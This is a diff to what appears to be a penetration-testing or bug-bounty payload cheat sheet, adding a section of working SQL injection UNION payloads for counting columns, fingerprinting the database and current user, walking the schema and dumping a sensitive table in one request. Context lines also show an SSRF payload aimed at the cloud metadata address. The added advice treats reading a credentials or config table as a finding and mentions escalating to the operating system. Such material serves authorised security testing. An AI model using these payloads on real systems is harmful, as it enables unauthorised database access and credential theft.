@@ -150,6 +150,21 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ' UNION SELECT 'a',NULL,NULL--
 ```
 
+### Fingerprint + Prove Readable Data (read-only PoC)
+```sql
+-- pick DBMS by stack: .asp/IIS→MSSQL, .php→MySQL, Java/Python→PG/Oracle
+-- column count first:  ' ORDER BY 1--  ↑ until error = N-1 cols
+0' UNION SELECT NULL,'MARKER',NULL--               -- find a displayable column
+-- fingerprint + identity (ONE readable value = valid finding):
+0' UNION SELECT NULL,@@version,NULL--              -- MSSQL/MySQL
+0' UNION SELECT NULL,version(),NULL--              -- PostgreSQL
+0' UNION SELECT NULL,SYSTEM_USER,NULL--            -- MSSQL (current_user / USER() elsewhere)
+-- schema walk + one-request dump of a sensitive table:
+0' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES--   -- MySQL/MSSQL/PG (Oracle: ALL_TABLES)
+-- MySQL GROUP_CONCAT() · MSSQL/PG STRING_AGG() · Oracle LISTAGG()  → dump in one request
+```
+Reading a credentials/config table is a valid standalone finding — submit on data, not a 500. (DB→OS escalation only if the DB user is sysadmin/superuser AND host exec is in scope.)
+
 ### Blind SQLi (time-based confirmation)
 ```sql
 # MySQL
